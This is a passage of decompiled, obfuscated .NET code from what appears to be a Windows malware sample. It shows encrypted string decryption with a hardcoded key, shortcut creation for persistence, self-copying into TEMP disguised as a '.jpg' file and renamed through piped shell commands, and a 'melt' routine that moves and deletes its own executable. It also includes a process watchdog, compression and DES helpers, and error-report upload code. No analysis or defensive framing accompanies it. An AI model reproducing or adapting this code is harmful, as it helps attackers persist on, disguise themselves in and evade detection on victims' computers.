					NewLateBinding.LateSet(objectValue2, (Type)null, "TargetPath", new object[1] { RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue, (Type)null, "ExpandEnvironmentStrings", new object[1] { text + Class21.smethod_154("fEzc44351CMchjFeeY23eA==") + "\\" + Class21.smethod_154("RcPeAUZ2tSiP21uqWifHZQ==") }, (string[])null, (Type[])null, (bool[])null)) }, (string[])null, (Type[])null);
					goto IL_048a;
					IL_048a:
					num = 36;
					NewLateBinding.LateSet(obj, (Type)null, "TargetPath", new object[1] { RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue, (Type)null, "ExpandEnvironmentStrings", new object[1] { text + Class21.smethod_154("fEzc44351CMchjFeeY23eA==") + "\\" + Class21.smethod_154("RcPeAUZ2tSiP21uqWifHZQ==") }, (string[])null, (Type[])null, (bool[])null)) }, (string[])null, (Type[])null);
					goto IL_04ee;
					IL_04ee:
					num = 37;
					NewLateBinding.LateSet(objectValue2, (Type)null, "WindowStyle", new object[1] { 4 }, (string[])null, (Type[])null);
					goto IL_0515;
					IL_0515:
					num = 38;
					NewLateBinding.LateCall(objectValue2, (Type)null, "Save", new object[0], (string[])null, (Type[])null, (bool[])null, true);
					goto IL_0531;
					IL_0531:
					num = 39;
					NewLateBinding.LateCall(obj, (Type)null, "Save", new object[0], (string[])null, (Type[])null, (bool[])null, true);
					goto IL_054d;
					IL_054d:
					num = 40;
					standardInput.Write(Class21.smethod_154("tooEKUPNPCsRNkaS3Hueqar3hTgD3+UMaiKlVz9fNin2nXZ/+dc8OLhhu6kefhMV") + text7 + Class21.smethod_154("fEzc44351CMchjFeeY23eA==") + "\\" + Class21.smethod_154("RcPeAUZ2tSiP21uqWifHZQ==") + Class21.smethod_154("N2125ojyLfd5vRuYzSjpwfaddn/51zw4uGG7qR5+ExU=") + Environment.NewLine);
					goto IL_05b6;
					IL_05b6:
					num = 42;
					if (!File.Exists(Interaction.Environ("TEMP") + "\\" + Class21.smethod_154("fEzc44351CMchjFeeY23eA==") + "\\" + Class21.smethod_154("RcPeAUZ2tSiP21uqWifHZQ==")))
					{
						goto IL_060f;
					}
					goto IL_06df;
					IL_060f:
					num = 43;
					File.Copy(Conversions.ToString(executablePath), Interaction.Environ("TEMP") + "\\" + Class21.smethod_154("fEzc44351CMchjFeeY23eA==") + "\\" + Class21.smethod_154("RcPeAUZ2tSiP21uqWifHZQ==") + ".jpg");
					goto IL_0672;
					IL_0672:
					num = 44;
					standardInput.Write("ren \"" + text7 + Class21.smethod_154("fEzc44351CMchjFeeY23eA==") + "\\" + Class21.smethod_154("RcPeAUZ2tSiP21uqWifHZQ==") + ".jpg\" " + Class21.smethod_154("RcPeAUZ2tSiP21uqWifHZQ==") + Environment.NewLine);
					goto IL_06df;
					IL_06df:
					num = 46;
					standardInput.Write("exit" + Environment.NewLine);
					goto IL_06f8;
					IL_06f8:
					num = 47;
					process.WaitForExit();
					goto IL_0703;
					end_IL_0000_2:
					break;
				}
				num = 49;
				standardInput.Flush();
				break;
				end_IL_0000:;
			}
			catch (object obj2) when (obj2 is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj2);
				try0000_dispatch = 2039;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	static void smethod_133(Exception exception_0, object object_0, object object_1, object object_2, object object_3, object object_4, object object_5, object object_6)
	{
		Class21.smethod_122(exception_0, new object[7] { object_0, object_1, object_2, object_3, object_4, object_5, object_6 });
	}

	static void smethod_134(EventArgs1 eventArgs1_0, bool bool_0)
	{
		eventArgs1_0.bool_2 = bool_0;
	}

	static Class32.Class36 smethod_135(Class32.Class37 class37_0)
	{
		byte[] array = new byte[class37_0.int_4];
		if (T1fpLDgQ4dlcokqoGbL())
		{
			switch (2)
			{
			case 0:
			case 2:
				break;
			default:
				goto IL_004b;
			}
		}
		Array.Copy(class37_0.byte_1, class37_0.int_3, array, 0, class37_0.int_4);
		goto IL_004b;
		IL_004b:
		return new Class32.Class36(array);
	}

	static string smethod_136()
	{
		try
		{
			return Application.get_ExecutablePath();
		}
		catch
		{
			return "N/A";
		}
	}

	static void smethod_137(short[] short_0, Class32.Class39.Class40 class40_0, byte[] byte_0)
	{
		class40_0.short_1 = short_0;
		class40_0.byte_0 = byte_0;
	}

	static void smethod_138(Class32.Class39.Class40 class40_0)
	{
		int[] array = new int[class40_0.int_3];
		int num = 0;
		class40_0.short_1 = new short[class40_0.short_0.Length];
		for (int i = 0; i < class40_0.int_3; i++)
		{
			array[i] = num;
			num += class40_0.int_2[i] << 15 - i;
		}
		for (int j = 0; j < class40_0.int_1; j++)
		{
			int num2 = class40_0.byte_0[j];
			if (num2 > 0)
			{
				class40_0.short_1[j] = Class21.smethod_14(array[num2 - 1]);
				array[num2 - 1] += 1 << 16 - num2;
			}
		}
	}

	[DllImport("user32", CharSet = CharSet.Unicode)]
	internal static extern int DrawText(IntPtr intptr_0, string string_0, int int_0, ref Class58.Struct23 struct23_0, int int_1);

	static int smethod_139(Class32.Class35 class35_0)
	{
		return 32768 - class35_0.int_1;
	}

	static void smethod_140(int int_0)
	{
		while (true)
		{
			try
			{
				Process.GetProcessById(int_0);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				Process.GetCurrentProcess().Kill();
				ProjectData.ClearProjectError();
			}
			Thread.Sleep(2000);
			GC.Collect();
		}
	}

	static Class32.Class36 smethod_141(Class32.Class37 class37_0)
	{
		byte[] array = new byte[class37_0.int_3];
		Array.Copy(class37_0.byte_1, 0, array, 0, class37_0.int_3);
		return new Class32.Class36(array);
	}

	static void smethod_142(Class32.Class34 class34_0)
	{
		class34_0.uint_0 >>= class34_0.int_2 & 7;
		class34_0.int_2 &= -8;
	}

	static void smethod_143(Form0 form0_0)
	{
		try
		{
			((Control)form0_0.panel_2).set_Visible(false);
			((Control)form0_0.panel_1).set_Visible(true);
			if (form0_0.eventArgs1_0 != null)
			{
				Class21.smethod_26((ThreadStart)form0_0.method_10, form0_0);
			}
		}
		catch
		{
		}
	}

	static Icon smethod_144()
	{
		int int_ = 0;
		int int_2 = 0;
		int num = ExtractIconEx(Application.get_ExecutablePath(), -1, ref int_2, ref int_2, 1);
		if (num > 0)
		{
			ExtractIconEx(Application.get_ExecutablePath(), 0, ref int_, ref int_2, 1);
			if (int_ != 0)
			{
				return Icon.FromHandle(new IntPtr(int_));
			}
		}
		return null;
	}

	static ICryptoTransform smethod_145(bool bool_0, byte[] byte_0, byte[] byte_1)
	{
		using DESCryptoServiceProvider dESCryptoServiceProvider = new DESCryptoServiceProvider();
		return bool_0 ? dESCryptoServiceProvider.CreateDecryptor(byte_0, byte_1) : dESCryptoServiceProvider.CreateEncryptor(byte_0, byte_1);
	}

	static void smethod_146(Exception exception_0)
	{
		Class21.smethod_122(exception_0, new object[0]);
	}

	static void smethod_147(Class32.Class39 class39_0)
	{
		for (int i = 0; i < class39_0.int_1; i++)
		{
			int num = class39_0.byte_1[i] & 0xFF;
			int num2 = class39_0.short_0[i];
			if (num2-- != 0)
			{
				int num3 = Class21.smethod_89(class39_0, num);
				Class21.smethod_37(class39_0.class40_0, num3);
				int num4 = (num3 - 261) / 4;
				if (num4 > 0 && num4 <= 5)
				{
					Class21.smethod_21(class39_0.class42_0, num & ((1 << num4) - 1), num4);
				}
				int num5 = Class21.smethod_64(class39_0, num2);
				Class21.smethod_37(class39_0.class40_1, num5);
				num4 = num5 / 2 - 1;
				if (num4 > 0)
				{
					Class21.smethod_21(class39_0.class42_0, num2 & ((1 << num4) - 1), num4);
				}
			}
			else
			{
				Class21.smethod_37(class39_0.class40_0, num);
			}
		}
		Class21.smethod_37(class39_0.class40_0, 256);
	}

	static void smethod_148(Class32.Class41 class41_0)
	{
		class41_0.int_0 = (class41_0.byte_0[class41_0.int_4] << 5) ^ class41_0.byte_0[class41_0.int_4 + 1];
	}

	static byte[] smethod_149(byte[] byte_0, int int_0, byte[] byte_1, byte[] byte_2)
	{
		try
		{
			Class32.Stream0 stream = new Class32.Stream0();
			switch (int_0)
			{
			case 0:
			{
				Class32.Class38 class2 = new Class32.Class38();
				DateTime now = DateTime.Now;
				long num3 = (uint)((((now.Year - 1980) & 0x7F) << 25) | (now.Month << 21) | (now.Day << 16) | (now.Hour << 11) | (now.Minute << 5) | (int)((uint)now.Second >> 1));
				uint[] array8 = new uint[256]
				{
					0u, 1996959894u, 3993919788u, 2567524794u, 124634137u, 1886057615u, 3915621685u, 2657392035u, 249268274u, 2044508324u,
					3772115230u, 2547177864u, 162941995u, 2125561021u, 3887607047u, 2428444049u, 498536548u, 1789927666u, 4089016648u, 2227061214u,
					450548861u, 1843258603u, 4107580753u, 2211677639u, 325883990u, 1684777152u, 4251122042u, 2321926636u, 335633487u, 1661365465u,
					4195302755u, 2366115317u, 997073096u, 1281953886u, 3579855332u, 2724688242u, 1006888145u, 1258607687u, 3524101629u, 2768942443u,
					901097722u, 1119000684u, 3686517206u, 2898065728u, 853044451u, 1172266101u, 3705015759u, 2882616665u, 651767980u, 1373503546u,
					3369554304u, 3218104598u, 565507253u, 1454621731u, 3485111705u, 3099436303u, 671266974u, 1594198024u, 3322730930u, 2970347812u,
					795835527u, 1483230225u, 3244367275u, 3060149565u, 1994146192u, 31158534u, 2563907772u, 4023717930u, 1907459465u, 112637215u,
					2680153253u, 3904427059u, 2013776290u, 251722036u, 2517215374u, 3775830040u, 2137656763u, 141376813u, 2439277719u, 3865271297u,
					1802195444u, 476864866u, 2238001368u, 4066508878u, 1812370925u, 453092731u, 2181625025u, 4111451223u, 1706088902u, 314042704u,
					2344532202u, 4240017532u, 1658658271u, 366619977u, 2362670323u, 4224994405u, 1303535960u, 984961486u, 2747007092u, 3569037538u,
					1256170817u, 1037604311u, 2765210733u, 3554079995u, 1131014506u, 879679996u, 2909243462u, 3663771856u, 1141124467u, 855842277u,
					2852801631u, 3708648649u, 1342533948u, 654459306u, 3188396048u, 3373015174u, 1466479909u, 544179635u, 3110523913u, 3462522015u,
					1591671054u, 702138776u, 2966460450u, 3352799412u, 1504918807u, 783551873u, 3082640443u, 3233442989u, 3988292384u, 2596254646u,
					62317068u, 1957810842u, 3939845945u, 2647816111u, 81470997u, 1943803523u, 3814918930u, 2489596804u, 225274430u, 2053790376u,
					3826175755u, 2466906013u, 167816743u, 2097651377u, 4027552580u, 2265490386u, 503444072u, 1762050814u, 4150417245u, 2154129355u,
					426522225u, 1852507879u, 4275313526u, 2312317920u, 282753626u, 1742555852u, 4189708143u, 2394877945u, 397917763u, 1622183637u,
					3604390888u, 2714866558u, 953729732u, 1340076626u, 3518719985u, 2797360999u, 1068828381u, 1219638859u, 3624741850u, 2936675148u,
					906185462u, 1090812512u, 3747672003u, 2825379669u, 829329135u, 1181335161u, 3412177804u, 3160834842u, 628085408u, 1382605366u,
					3423369109u, 3138078467u, 570562233u, 1426400815u, 3317316542u, 2998733608u, 733239954u, 1555261956u, 3268935591u, 3050360625u,
					752459403u, 1541320221u, 2607071920u, 3965973030u, 1969922972u, 40735498u, 2617837225u, 3943577151u, 1913087877u, 83908371u,
					2512341634u, 3803740692u, 2075208622u, 213261112u, 2463272603u, 3855990285u, 2094854071u, 198958881u, 2262029012u, 4057260610u,
					1759359992u, 534414190u, 2176718541u, 4139329115u, 1873836001u, 414664567u, 2282248934u, 4279200368u, 1711684554u, 285281116u,
					2405801727u, 4167216745u, 1634467795u, 376229701u, 2685067896u, 3608007406u, 1308918612u, 956543938u, 2808555105u, 3495958263u,
					1231636301u, 1047427035u, 2932959818u, 3654703836u, 1088359270u, 936918000u, 2847714899u, 3736837829u, 1202900863u, 817233897u,
					3183342108u, 3401237130u, 1404277552u, 615818150u, 3134207493u, 3453421203u, 1423857449u, 601450431u, 3009837614u, 3294710456u,
					1567103746u, 711928724u, 3020668471u, 3272380065u, 1510334235u, 755167117u
				};
				uint num4 = uint.MaxValue;
				uint num5 = uint.MaxValue;
				int num6 = 0;
				int num7 = byte_2.Length;
				while (--num7 >= 0)
				{
					num5 = array8[(num5 ^ byte_2[num6++]) & 0xFF] ^ (num5 >> 8);
				}
				num5 ^= num4;
				Class21.smethod_78(stream, 67324752);
				Class21.smethod_20(stream, 20);
				Class21.smethod_20(stream, 0);
				Class21.smethod_20(stream, 8);
				Class21.smethod_78(stream, (int)num3);
				Class21.smethod_78(stream, (int)num5);
				long position3 = stream.Position;
				Class21.smethod_78(stream, 0);
				Class21.smethod_78(stream, byte_2.Length);
				byte[] bytes = Encoding.UTF8.GetBytes("{data}");
				Class21.smethod_20(stream, bytes.Length);
				Class21.smethod_20(stream, 0);
				stream.Write(bytes, 0, bytes.Length);
				Class21.smethod_66(class2, byte_2);
				while (!class2.IsNeedingInput)
				{
					byte[] array9 = new byte[512];
					int num8 = Class21.smethod_86(array9, class2);
					if (num8 <= 0)
					{
						break;
					}
					stream.Write(array9, 0, num8);
				}
				Class21.smethod_13(class2);
				while (!class2.IsFinished)
				{
					byte[] array10 = new byte[512];
					int num9 = Class21.smethod_86(array10, class2);
					if (num9 <= 0)
					{
						break;
					}
					stream.Write(array10, 0, num9);
				}
				long totalOut = class2.TotalOut;
				Class21.smethod_78(stream, 33639248);
				Class21.smethod_20(stream, 20);
				Class21.smethod_20(stream, 20);
				Class21.smethod_20(stream, 0);
				Class21.smethod_20(stream, 8);
				Class21.smethod_78(stream, (int)num3);
				Class21.smethod_78(stream, (int)num5);
				Class21.smethod_78(stream, (int)totalOut);
				Class21.smethod_78(stream, byte_2.Length);
				Class21.smethod_20(stream, bytes.Length);
				Class21.smethod_20(stream, 0);
				Class21.smethod_20(stream, 0);
				Class21.smethod_20(stream, 0);
				Class21.smethod_20(stream, 0);
				Class21.smethod_78(stream, 0);
				Class21.smethod_78(stream, 0);
				stream.Write(bytes, 0, bytes.Length);
				Class21.smethod_78(stream, 101010256);
				Class21.smethod_20(stream, 0);
				Class21.smethod_20(stream, 0);
				Class21.smethod_20(stream, 1);
				Class21.smethod_20(stream, 1);
				Class21.smethod_78(stream, 46 + bytes.Length);
				Class21.smethod_78(stream, (int)(30 + bytes.Length + totalOut));
				Class21.smethod_20(stream, 0);
				stream.Seek(position3, SeekOrigin.Begin);
				Class21.smethod_78(stream, (int)totalOut);
				break;
			}
			case 1:
			{
				Class21.smethod_78(stream, 25000571);
				Class21.smethod_78(stream, byte_2.Length);
				byte[] array5;
				for (int i = 0; i < byte_2.Length; i += array5.Length)
				{
					array5 = new byte[Math.Min(2097151, byte_2.Length - i)];
					Buffer.BlockCopy(byte_2, i, array5, 0, array5.Length);
					long position = stream.Position;
					Class21.smethod_78(stream, 0);
					Class21.smethod_78(stream, array5.Length);
					Class32.Class38 @class = new Class32.Class38();
					Class21.smethod_66(@class, array5);
					while (!@class.IsNeedingInput)
					{
						byte[] array6 = new byte[512];
						int num = Class21.smethod_86(array6, @class);
						if (num <= 0)
						{
							break;
						}
						stream.Write(array6, 0, num);
					}
					Class21.smethod_13(@class);
					while (!@class.IsFinished)
					{
						byte[] array7 = new byte[512];
						int num2 = Class21.smethod_86(array7, @class);
						if (num2 <= 0)
						{
							break;
						}
						stream.Write(array7, 0, num2);
					}
					long position2 = stream.Position;
					stream.Position = position;
					Class21.smethod_78(stream, (int)@class.TotalOut);
					stream.Position = position2;
				}
				break;
			}
			case 2:
			{
				Class21.smethod_78(stream, 41777787);
				byte[] array3 = Class21.smethod_149((byte[])null, 1, (byte[])null, byte_2);
				using (ICryptoTransform cryptoTransform2 = Class21.smethod_145(bool_0: false, byte_0, byte_1))
				{
					byte[] array4 = cryptoTransform2.TransformFinalBlock(array3, 0, array3.Length);
					stream.Write(array4, 0, array4.Length);
				}
				break;
			}
			case 3:
			{
				Class21.smethod_78(stream, 58555003);
				byte[] array = Class21.smethod_149((byte[])null, 1, (byte[])null, byte_2);
				using (ICryptoTransform cryptoTransform = Class21.smethod_57(bool_0: false, byte_0, byte_1))
				{
					byte[] array2 = cryptoTransform.TransformFinalBlock(array, 0, array.Length);
					stream.Write(array2, 0, array2.Length);
				}
				break;
			}
			}
			stream.Flush();
			stream.Close();
			return stream.ToArray();
		}
		catch (Exception ex)
		{
			Class32.string_0 = "ERR 2003: " + ex.Message;
			throw;
		}
	}

	static void smethod_150(Class32.Class39.Class40 class40_0)
	{
		int num = class40_0.short_0.Length;
		int num12 = default(int);
		while (true)
		{
			int[] array = new int[num];
			int num2 = 0;
			while (true)
			{
				int num3 = 0;
				int num4 = 0;
				while (true)
				{
					IL_02dd:
					if (num4 < num)
					{
						int num5 = class40_0.short_0[num4];
						if (num5 != 0)
						{
							int num6 = num2++;
							int num7;
							while (num6 > 0 && class40_0.short_0[array[num7 = (num6 - 1) / 2]] > num5)
							{
								array[num6] = array[num7];
								num6 = num7;
							}
							array[num6] = num4;
							num3 = num4;
						}
					}
					else
					{
						while (true)
						{
							if (num2 < 2)
							{
								int num8 = ((num3 < 2) ? (++num3) : 0);
								array[num2++] = num8;
								continue;
							}
							while (true)
							{
								IL_0299:
								class40_0.int_1 = Math.Max(num3 + 1, class40_0.int_0);
								int num9 = num2;
								int[] array2 = new int[4 * num2 - 2];
								int[] array3 = new int[2 * num2 - 1];
								int num10 = num9;
								while (true)
								{
									IL_0295:
									int num11 = 0;
									while (true)
									{
										IL_028b:
										if (num11 < num2)
										{
											num12 = array[num11];
											goto IL_0089;
										}
										while (true)
										{
											IL_0273:
											int num13 = array[0];
											int num14 = array[--num2];
											int num15 = 0;
											int num16 = 1;
											while (true)
											{
												if (num16 < num2)
												{
													if (num16 + 1 < num2 && array3[array[num16]] > array3[array[num16 + 1]])
													{
														num16++;
													}
													array[num15] = array[num16];
													num15 = num16;
													goto IL_00e0;
												}
												int num17 = array3[num14];
												while (true)
												{
													IL_0228:
													if ((num16 = num15) <= 0 || array3[array[num15 = (num16 - 1) / 2]] <= num17)
													{
														array[num16] = num14;
														int num18 = array[0];
														num14 = num10++;
														array2[2 * num14] = num13;
														array2[2 * num14 + 1] = num18;
														int num19 = Math.Min(array3[num13] & 0xFF, array3[num18] & 0xFF);
														num17 = (array3[num14] = array3[num13] + array3[num18] - num19 + 1);
														num15 = 0;
														num16 = 1;
														while (true)
														{
															if (num16 < num2)
															{
																if (num16 + 1 < num2 && array3[array[num16]] > array3[array[num16 + 1]])
																{
																	num16++;
																}
																array[num15] = array[num16];
																goto IL_0189;
															}
															if (!T1fpLDgQ4dlcokqoGbL())
															{
																break;
															}
															switch (13)
															{
															case 6:
																break;
															case 17:
																goto IL_0089;
															default:
																goto IL_0099;
															case 4:
															case 11:
																goto IL_00e0;
															case 7:
																goto IL_0189;
															case 16:
																continue;
															case 12:
																goto IL_0228;
															case 3:
																if (array3[array[num15 = (num16 - 1) / 2]] > num17)
																{
																	array[num16] = array[num15];
																	goto case 13;
																}
																goto IL_0265;
															case 13:
																if ((num16 = num15) > 0)
																{
																	goto case 3;
																}
																goto IL_0265;
															case 5:
																goto IL_028b;
															case 18:
																goto IL_0295;
															case 1:
																goto IL_0299;
															case 0:
															case 14:
																goto end_IL_0200;
															case 2:
															case 15:
																goto IL_02dd;
															case 10:
																goto end_IL_02dd;
															case 8:
																goto end_IL_02e7;
															case 19:
																{
																	Class21.smethod_107(class40_0, array2);
																	return;
																}
																IL_0265:
																array[num16] = num14;
																if (num2 > 1)
																{
																	goto IL_0273;
																}
																goto case 19;
															}
															goto end_IL_02d3;
															IL_0189:
															num15 = num16;
															num16 = num15 * 2 + 1;
															continue;
															end_IL_0200:
															break;
														}
														break;
													}
													array[num16] = array[num15];
												}
												break;
												IL_00e0:
												num16 = num16 * 2 + 1;
											}
											break;
										}
										break;
										IL_0089:
										array2[2 * num11] = num12;
										array2[2 * num11 + 1] = -1;
										goto IL_0099;
										IL_0099:
										array3[num11] = class40_0.short_0[num12] << 8;
										array[num11] = num11;
										num11++;
									}
									break;
								}
								break;
							}
							continue;
							end_IL_02d3:
							break;
						}
					}
					num4++;
					continue;
					end_IL_02dd:
					break;
				}
				continue;
				end_IL_02e7:
				break;
			}
		}
	}

	static Icon smethod_151(string string_0)
	{
		//IL_001f: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream("SmartAssembly.SmartExceptionsCore.Resources." + string_0 + ".ico");
			return (manifestResourceStream == null) ? ((Icon)null) : new Icon(manifestResourceStream);
		}
		catch
		{
			return null;
		}
	}

	static bool smethod_152(Class32.Class41 class41_0)
	{
		return class41_0.int_8 == class41_0.int_7;
	}

	[DllImport("kernel32", CharSet = CharSet.Unicode, SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	internal static extern bool DeleteFile(string string_0);

	static void smethod_153(Exception exception_0, object object_0, object object_1)
	{
		Class21.smethod_122(exception_0, new object[2] { object_0, object_1 });
	}

	static string smethod_154(string string_0)
	{
		string s = "港九方个人名港件";
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
		string text = "";
		string result = default(string);
		try
		{
			byte[] array = new byte[32];
			byte[] sourceArray = mD5CryptoServiceProvider.ComputeHash(Encoding.ASCII.GetBytes(s));
			Array.Copy(sourceArray, 0, array, 0, 10);
			Array.Copy(sourceArray, 0, array, 15, 10);
			rijndaelManaged.Key = array;
			rijndaelManaged.Mode = CipherMode.ECB;
			ICryptoTransform cryptoTransform = rijndaelManaged.CreateDecryptor();
			byte[] array2 = Convert.FromBase64String(string_0);
			text = Encoding.ASCII.GetString(cryptoTransform.TransformFinalBlock(array2, 0, array2.Length));
			result = text;
			return result;
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.ClearProjectError();
		}
		return result;
	}

	static void smethod_155(string string_0, Class57 class57_0, string string_1, Delegate21 delegate21_0, string string_2, byte[] byte_0)
	{
		try
		{
			ReportingService reportingService = new ReportingService(class57_0.string_2);
			if (class57_0.iwebProxy_0 != null)
			{
				((HttpWebClientProtocol)reportingService).set_Proxy(class57_0.iwebProxy_0);
			}
			delegate21_0(reportingService.UploadReport2(class57_0.string_1, byte_0, string_2, string_0, string_1));
		}
		catch (Exception ex)
		{
			delegate21_0("ERR 2002: " + ex.Message);
		}
	}

	static bool smethod_156(Class32.Class33 class33_0)
	{
		int num = Class21.smethod_139(class33_0.class35_0);
		while (num >= 258)
		{
			switch (class33_0.int_4)
			{
			case 7:
			{
				int num2;
				while (((num2 = Class21.smethod_58(class33_0.class36_0, class33_0.class34_0)) & -256) == 0)
				{
					Class21.smethod_93(class33_0.class35_0, num2);
					if (--num < 258)
					{
						return true;
					}
				}
				if (num2 >= 257)
				{
					class33_0.int_6 = Class32.Class33.int_0[num2 - 257];
					class33_0.int_5 = Class32.Class33.int_1[num2 - 257];
					goto case 8;
				}
				if (num2 < 0)
				{
					return false;
				}
				class33_0.class36_1 = null;
				class33_0.class36_0 = null;
				class33_0.int_4 = 2;
				return true;
			}
			case 8:
				if (class33_0.int_5 > 0)
				{
					class33_0.int_4 = 8;
					int num4 = Class21.smethod_62(class33_0.class34_0, class33_0.int_5);
					if (num4 < 0)
					{
						return false;
					}
					Class21.smethod_4(class33_0.class34_0, class33_0.int_5);
					class33_0.int_6 += num4;
				}
				class33_0.int_4 = 9;
				goto case 9;
			case 9:
			{
				int num2 = Class21.smethod_58(class33_0.class36_1, class33_0.class34_0);
				if (num2 >= 0)
				{
					class33_0.int_7 = Class32.Class33.int_2[num2];
					class33_0.int_5 = Class32.Class33.int_3[num2];
					goto case 10;
				}
				return false;
			}
			case 10:
				if (class33_0.int_5 > 0)
				{
					class33_0.int_4 = 10;
					int num3 = Class21.smethod_62(class33_0.class34_0, class33_0.int_5);
					if (num3 < 0)
					{
						return false;
					}
					Class21.smethod_4(class33_0.class34_0, class33_0.int_5);
					class33_0.int_7 += num3;
				}
				Class21.smethod_43(class33_0.class35_0, class33_0.int_6, class33_0.int_7);
				num -= class33_0.int_6;
				class33_0.int_4 = 7;
				break;
			}
		}
		return true;
	}

	static object smethod_157(string string_0, object object_0)
	{
		using RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(Class31.SubkeyApplication);
		if (registryKey == null)
		{
			return object_0;
		}
		return registryKey.GetValue(string_0, object_0);
	}

	static object smethod_158(Class50 class50_0)
	{
		return class50_0.object_0;
	}

	static int smethod_159(string string_0, Class46 class46_0)
	{
		try
		{
			bool flag = class46_0.char_0[0] == '\u0001';
			int result = default(int);
			char c = default(char);
			bool flag2 = default(bool);
			int i = default(int);
			while (string_0 != null && string_0.Length != 0 && (!flag || string_0.Length <= 4) && (flag || string_0[0] == '#'))
			{
				int num = 0;
				int num2 = string_0.Length - 1;
				while (true)
				{
					if (num2 >= 0)
					{
						if (!flag)
						{
							if (num2 == 0)
							{
								goto IL_00f1;
							}
							if (!T1fpLDgQ4dlcokqoGbL())
							{
								continue;
							}
							switch (2)
							{
							case 1:
							case 2:
								break;
							case 3:
								goto IL_00b9;
							case 0:
								goto IL_00d9;
							case 7:
								continue;
							case 6:
								goto end_IL_00e0;
							case 9:
								goto IL_00f1;
							default:
								goto IL_00f7;
							case 5:
								return result;
							}
						}
						c = string_0[num2];
						flag2 = false;
						i = 0;
						goto IL_00b9;
					}
					goto IL_00f1;
					IL_00f1:
					return num;
					IL_00b9:
					for (; i < class46_0.char_0.Length; i++)
					{
						if (class46_0.char_0[i] == c)
						{
							num = num * class46_0.char_0.Length + i;
							flag2 = true;
							break;
						}
					}
					goto IL_00d9;
					IL_00d9:
					if (flag2)
					{
						num2--;
						continue;
					}
					goto IL_00f7;
					IL_00f7:
					return -1;
					continue;
					end_IL_00e0:
					break;
				}
			}
			return -1;
		}
		catch
		{
			return -1;
		}
	}

	static void smethod_160(Exception exception_0, object object_0, object object_1, object object_2)
	{
		Class21.smethod_122(exception_0, new object[3] { object_0, object_1, object_2 });
	}

	static void smethod_161()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		string text = default(string);
		object executablePath = default(object);
		bool flag = default(bool);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				string text2;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0008;
				case 301:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0008;
						case 3:
							goto IL_002a;
						case 4:
							goto IL_0056;
						case 5:
							goto IL_005f;
						case 6:
							goto IL_0064;
						case 7:
							goto IL_008f;
						case 8:
						case 9:
							goto IL_0094;
						case 12:
							goto IL_00a0;
						case 13:
							goto IL_00a4;
						case 14:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 10:
						case 11:
						case 15:
						case 16:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_00a4:
					num = 13;
					File.Delete(text + "melt.txt");
					break;
					IL_0008:
					num = 2;
					text2 = Interaction.Environ(Class21.smethod_154("5g+BxFHXkdTcEM3cEGgk0A==")) + Class21.smethod_154("sscpRZTSpuugDgOvmaPPPu6b/X9gZRYeKcyavwZ3WPM=");
					goto IL_002a;
					IL_002a:
					num = 3;
					text = "" + Interaction.Environ(Class21.smethod_154("5g+BxFHXkdTcEM3cEGgk0A==")) + Class21.smethod_154("923lYoAhb2vVXIM6u3MCzjKugVDBXZMcbb6ThbsL5r8=") + "";
					goto IL_0056;
					IL_0056:
					num = 4;
					executablePath = Application.get_ExecutablePath();
					goto IL_005f;
					IL_005f:
					num = 5;
					flag = false;
					goto IL_0064;
					IL_0064:
					num = 6;
					if (Operators.ConditionalCompareObjectEqual(executablePath, (object)(text + Class21.smethod_154("fEzc44351CMchjFeeY23eA==") + "\\" + Class21.smethod_154("RcPeAUZ2tSiP21uqWifHZQ==")), false))
					{
						goto IL_008f;
					}
					goto IL_0094;
					IL_008f:
					num = 7;
					flag = true;
					goto IL_0094;
					IL_0094:
					num = 9;
					if (flag)
					{
						goto end_IL_0000_3;
					}
					goto IL_00a0;
					IL_00a0:
					num = 12;
					goto IL_00a4;
					end_IL_0000_2:
					break;
				}
				num = 14;
				File.Move(Application.get_ExecutablePath(), text + "melt.txt");
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 301;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	static int smethod_162(Class32.Class39.Class40 class40_0)
	{
		int num = 0;
		for (int i = 0; i < class40_0.short_0.Length; i++)
		{
			num += class40_0.short_0[i] * class40_0.byte_0[i];
		}
		return num;
	}

	static void smethod_163(Exception exception_0, object[] object_0)
	{
		try
		{
			if ((object)exception_0.GetType() == typeof(Exception) && exception_0.Message == "{report}")
			{
				exception_0 = exception_0.InnerException;
			}
			else
			{
				Class21.smethod_122(exception_0, object_0);
			}
			Class55.Handler.method_3(exception_0, bool_1: true, bool_2: true);
		}
		catch
		{
		}
	}

	[DllImport("user32.dll")]
	internal static extern int GetSystemMetrics(int int_0);

	static void smethod_164()
	{
		string text = "";
	}

	static void smethod_165(Control0 control0_0)
	{
		Class21.smethod_23(string.Empty, control0_0);
	}

	static void smethod_166(int int_0, int int_1, byte[] byte_0, Class32.Class42 class42_0)
	{
